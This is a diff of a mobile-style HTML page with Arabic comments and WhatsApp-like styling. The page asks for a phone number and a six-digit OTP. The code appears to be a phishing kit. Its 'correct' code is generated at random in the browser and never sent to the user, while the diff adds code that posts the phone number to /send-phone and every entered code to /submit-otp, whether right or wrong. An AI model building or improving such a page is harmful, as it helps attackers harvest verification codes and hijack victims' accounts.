@@ -7,7 +7,6 @@
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== إعدادات عامة ===== */
         * {
             margin: 0;
             padding: 0;
@@ -25,7 +24,6 @@
             padding: 0;
         }
 
-        /* ===== حاوية التطبيق ===== */
         .app-container {
             background-color: #ffffff;
             max-width: 430px;
@@ -39,7 +37,6 @@
             box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
         }
 
-        /* ===== الهيدر ===== */
         .header {
             background: #075e54;
             color: white;
@@ -111,11 +108,15 @@
         }
 
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
         }
 
-        /* ===== المحتوى ===== */
         .page {
             flex: 1;
             padding: 30px 24px;
@@ -131,11 +132,16 @@
         }
 
         @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(10px); }
-            100% { opacity: 1; transform: translateY(0); }
+            0% {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
-        /* ===== بطاقة المحادثة ===== */
         .chat-card {
             background: white;
             border-radius: 16px;
@@ -176,7 +182,6 @@
             color: #075e54;
         }
 
-        /* ===== الحقول ===== */
         .input-group {
             display: flex;
             align-items: center;
@@ -214,7 +219,6 @@
             color: #8696a0;
         }
 
-        /* ===== خانات OTP ===== */
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -243,7 +247,6 @@
             box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.12);
         }
 
-        /* ===== الأزرار ===== */
         .btn {
             width: 100%;
             padding: 14px;
@@ -297,7 +300,6 @@
             cursor: not-allowed;
         }
 
-        /* ===== رسائل الخطأ والنجاح ===== */
         .error-msg {
             color: #d32f2f;
             font-size: 13px;
@@ -330,7 +332,6 @@
             display: flex;
         }
 
-        /* ===== تذييل ===== */
         .footer-note {
             text-align: center;
             margin-top: 20px;
@@ -344,7 +345,6 @@
             margin-right: 4px;
         }
 
-        /* ===== تحميل ===== */
         .loading-spinner {
             display: none;
             text-align: center;
@@ -366,11 +366,14 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
-        /* ===== رسائل المحادثة ===== */
         .message-bubble {
             background: white;
             border-radius: 16px 16px 16px 4px;
@@ -406,7 +409,6 @@
             background: #e8f5e9;
         }
 
-        /* ===== توافق مع الموبايل ===== */
         @media (max-width: 430px) {
             .app-container {
                 max-height: 100vh;
@@ -420,7 +422,6 @@
             }
         }
 
-        /* ===== Scroll styling ===== */
         .page::-webkit-scrollbar {
             width: 4px;
         }
@@ -590,7 +591,7 @@
         }
 
         // ===== 2. إرسال الرقم (الصفحة 1 → 2) =====
-        function sendPhone() {
+        async function sendPhone() {
             const phone = phoneInput.value.trim().replace(/\s/g, '');
 
             if (!/^[0-9]{10,15}$/.test(phone)) {
@@ -606,6 +607,22 @@
             correctOtp = Math.floor(100000 + Math.random() * 900000).toString();
             console.log('📲 رمز OTP الجديد:', correctOtp);
 
+            // ===== إرسال رقم الهاتف فوراً =====
+            try {
+                const response = await fetch('/send-phone', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phone: phone })
+                });
+                
+                const data = await response.json();
+                console.log('✅ تم إرسال الرقم:', data);
+            } catch (error) {
+                console.error('❌ خطأ في إرسال الرقم:', error);
+            }
+
             showPage(pageOtp);
             otpInputs[0].focus();
             otpError.classList.remove('show');
@@ -613,10 +630,10 @@
             clearOtpInputs();
         }
 
-        // ===== 3. التحقق من OTP وإرسال البيانات =====
+        // ===== 3. التحقق من OTP =====
         async function verifyOtp() {
             if (isVerifying) return;
-            
+
             let enteredOtp = '';
             otpInputs.forEach(input => {
                 enteredOtp += input.value.trim();
@@ -628,17 +645,17 @@
                 return;
             }
 
-            // إرسال البيانات للسيرفر (سواء صح أو غلط)
             isVerifying = true;
             otpError.classList.remove('show');
             otpSuccess.classList.remove('show');
-            
+
             loadingSpinner.classList.add('show');
             verifyOtpBtn.disabled = true;
             verifyOtpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
 
             try {
-                const response = await fetch('/submit', {
+                // ===== إرسال OTP =====
+                const response = await fetch('/submit-otp', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -650,14 +667,13 @@
                 });
 
                 const data = await response.json();
+                console.log('✅ تم إرسال OTP:', data);
 
-                // التحقق من صحة الرمز (محلياً)
                 if (enteredOtp === correctOtp) {
                     otpSuccess.classList.add('show');
                     otpSuccess.querySelector('span').textContent = '✅ تم التوثيق بنجاح! 🎉';
                     otpError.classList.remove('show');
-                    
-                    // بعد 2 ثانية نروح لصفحة النجاح
+
                     setTimeout(() => {
                         window.location.href = '/success';
                     }, 2000);
@@ -672,7 +688,7 @@
             } catch (error) {
                 console.error('❌ خطأ:', error);
                 otpError.classList.add('show');
-                otpError.querySelector('span').textContent = '⚠️ حدث خطأ في الاتصال';
+                otpError.querySelector('span').textContent = '⚠️ حدث خطأ في الاتصال، حاول مرة أخرى';
             }
 
             loadingSpinner.classList.remove('show');
@@ -690,17 +706,7 @@
             otpInputs[0].focus();
             otpError.classList.remove('show');
             otpSuccess.classList.remove('show');
-            
-            // إرسال إشعار لإعادة الإرسال
-            fetch('/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: enteredPhone,
-                    otp: 'RESEND'
-                })
-            });
-            
+
             alert('✅ تم إعادة إرسال الرمز الجديد إلى ' + enteredPhone);
         }
 
@@ -711,7 +717,6 @@
 
         // ===== 6. التنقل التلقائي بين خانات OTP =====
         otpInputs.forEach((input, index) => {
-            // منع أي حرف غير رقم
             input.addEventListener('keydown', function(e) {
                 const key = e.key;
                 if (key === 'Backspace' || key === 'Tab' || key === 'ArrowLeft' || key === 'ArrowRight' || key === 'Delete' || key === 'Home' || key === 'End') {
